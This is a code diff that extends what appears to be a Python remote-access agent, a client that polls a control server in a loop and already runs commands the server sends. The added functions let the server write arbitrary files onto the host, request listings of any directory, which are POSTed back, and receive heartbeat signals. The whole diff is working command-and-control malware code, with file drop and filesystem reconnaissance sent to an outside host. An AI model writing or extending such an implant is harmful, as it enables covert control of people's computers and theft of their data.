@@ -25,12 +25,10 @@ def get_uptime():
     try:
         if os.name == 'posix':
             if platform.system() == 'Darwin':
-                # macOS
                 output = subprocess.check_output("sysctl -n kern.boottime", shell=True, text=True)
                 boot_time = int(output.split('sec =')[1].split(',')[0].strip())
                 return int(time.time() - boot_time)
             else:
-                # Linux
                 with open('/proc/uptime', 'r') as f:
                     return int(float(f.readline().split()[0]))
         else:
@@ -47,6 +45,18 @@ def get_ip():
         return ip
     except:
         return socket.gethostbyname(socket.gethostname())
+    
+def check_heartbeat_request():
+    try:
+        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+        conn.request("GET", "/should_ping")
+        response = conn.getresponse()
+        if response.status == 200 and response.read().decode().strip() == "yes":
+            conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+            conn.request("POST", "/heartbeat")
+            conn.getresponse()
+    except:
+        pass
 
 def post_info():
     try:
@@ -69,6 +79,27 @@ def check_info_request():
                 post_info()
     except Exception as e:
         print(f"[!] Error checking for system info request: {e}")
+
+def check_file_download():
+    try:
+        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+        conn.request("GET", "/get_file")
+        response = conn.getresponse()
+        if response.status == 200:
+            data = json.loads(response.read().decode())
+            filename = data.get("filename")
+            content = data.get("content")
+            if filename and content:
+                with open(filename, "wb") as f:
+                    f.write(content.encode("latin1"))  # binary-safe
+                print(f"[+] Received file: {filename}")
+
+                # Acknowledge to server
+                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+                conn.request("POST", "/ack_file")
+                conn.getresponse()
+    except Exception as e:
+        print(f"[!] Error downloading file: {e}")
 
 def get_command():
     try:
@@ -98,9 +129,40 @@ def run_command(cmd):
         output = e.output
     return output
 
+def check_browse_request():
+    try:
+        conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+        conn.request("GET", "/should_browse")
+        response = conn.getresponse()
+        if response.status == 200:
+            data = json.loads(response.read().decode())
+            path = data.get("path")
+            if path:
+                listing = []
+                for name in os.listdir(path):
+                    full_path = os.path.join(path, name)
+                    info = {
+                        "name": name,
+                        "type": "dir" if os.path.isdir(full_path) else "file",
+                        "size": os.path.getsize(full_path) if os.path.isfile(full_path) else "-"
+                    }
+                    listing.append(info)
+                # Send to server
+                conn = http.client.HTTPConnection(SERVER_HOST, SERVER_PORT)
+                headers = {"Content-type": "application/json"}
+                payload = json.dumps({"listing": listing})
+                conn.request("POST", "/post_listing", body=payload, headers=headers)
+                conn.getresponse()
+    except Exception as e:
+        print(f"[!] Error checking directory listing: {e}")
+
+
 def main():
     while True:
         check_info_request()
+        check_file_download()
+        check_heartbeat_request()
+        check_browse_request()
         cmd = get_command()
         if cmd and cmd.lower() != "none":
             print(f"[+] Received command: {cmd}")
